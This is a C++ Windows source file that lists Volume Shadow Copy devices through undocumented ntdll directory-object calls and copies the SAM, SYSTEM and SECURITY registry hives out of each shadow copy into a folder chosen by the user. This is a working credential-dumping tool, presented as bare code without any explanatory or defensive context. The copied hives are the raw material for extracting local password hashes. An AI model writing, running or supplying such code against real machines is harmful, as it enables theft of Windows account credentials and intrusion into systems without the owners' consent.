#include <Windows.h>
#include <stdio.h>
#include "structs.h"
//https://stackoverflow.com/questions/2643084/sysinternals-winobj-device-listing-mechanism

using _NtOpenDirectoryObject = NTSTATUS(NTAPI*)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
using _NtQueryDirectoryObject = NTSTATUS(NTAPI*)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
void Copy(wchar_t* vss, wchar_t* destination) {
	HANDLE file = CreateFile(vss, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE) {
		DWORD size = GetFileSize(file, NULL);
		char* data = (char*)malloc(size);
		DWORD bytesread = 0;
		DWORD byteswritten = 0;

		bool success = ReadFile(file, data, size, &bytesread, NULL);
		if (success) {



			HANDLE copy = CreateFile(destination, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (copy != INVALID_HANDLE_VALUE) {

				success = WriteFile(copy, data, size, &byteswritten, NULL);
				if (success) {
					printf("Data written to %ws\n", destination);
				}
				free(data);
				CloseHandle(copy);
				CloseHandle(file);
			}
		}


	}

}
void Find(wchar_t* argument) {
	_NtQueryDirectoryObject NtQueryDirectoryObject = (_NtQueryDirectoryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryDirectoryObject");
	_NtOpenDirectoryObject NtOpenDirectoryObect = (_NtOpenDirectoryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenDirectoryObject");
	HANDLE dirobject;
	wchar_t* destination = new wchar_t[512];
	OBJECT_ATTRIBUTES obj;
	const wchar_t device[] = L"\\Device";
	UNICODE_STRING unicode_string = { 0 };
	unicode_string.Length = wcslen(device) * 2;
	unicode_string.MaximumLength = wcslen(device) * 2 + 2;
	unicode_string.Buffer = (PWSTR)device;
	InitializeObjectAttributes(&obj, &unicode_string, 0, 0, 00);

	NTSTATUS result = NtOpenDirectoryObect(&dirobject, 0x0001 | 0x0002, &obj);
	if (result == 0) {

		BYTE* buffer = new BYTE[100000];
		wchar_t* hive = new wchar_t[512];
		
		ULONG start = 0, index = 0, bytes;
		DWORD num_of_vss = 0;
		BOOLEAN restart = TRUE;
		for (;;)
		{
			result = NtQueryDirectoryObject(dirobject, PBYTE(buffer), 100000, FALSE, restart, &index, &bytes);
			if (result == 0)
			{
				POBJECT_DIRECTORY_INFORMATION const objectlist = reinterpret_cast<POBJECT_DIRECTORY_INFORMATION>(PBYTE(buffer));
				for (ULONG i = 0; i < index - start; i++)
				{
					if (0 == wcsncmp(objectlist[i].TypeName.Buffer, L"Device", objectlist[i].TypeName.Length / sizeof(WCHAR)))
					{
						if (wcsstr(objectlist[i].Name.Buffer, L"ShadowCopy")) {
							printf("Found VSS: %ws\n", objectlist[i].Name.Buffer);
							swprintf(hive, 200, L"\\\\?\\GLOBALROOT\\Device\\%s\\windows\\system32\\config\\sam", objectlist[i].Name.Buffer);
							swprintf(destination, 256, L"%s\\sam_%d.hive", argument,num_of_vss);
							Copy(hive, destination);
							swprintf(hive, 200, L"\\\\?\\GLOBALROOT\\Device\\%s\\windows\\system32\\config\\system", objectlist[i].Name.Buffer);
							swprintf(destination, 256, L"%s\\system_%d.hive", argument,num_of_vss);
							Copy(hive, destination);
							swprintf(hive, 200, L"\\\\?\\GLOBALROOT\\Device\\%s\\windows\\system32\\config\\security", objectlist[i].Name.Buffer);
							swprintf(destination, 256, L"%s\\security_%d.hive", argument,num_of_vss);
							Copy(hive, destination);
							num_of_vss += 1;
							
							

						}
					}
				}
			}
			if (STATUS_MORE_ENTRIES == result)
			{
				start = index;
				restart = FALSE;
				continue;
			}
			if (((STATUS_NO_MORE_ENTRIES == 0 || (result ==0))) && num_of_vss == 0)
			{
				printf("Can't find VSS!\n");
				exit(0);

			}
			else if (STATUS_NO_MORE_ENTRIES == 0 || (result == 0)) {
				exit(0);

			}
		}
		delete[] buffer;
		delete[] destination;
		delete[] hive;

	}
}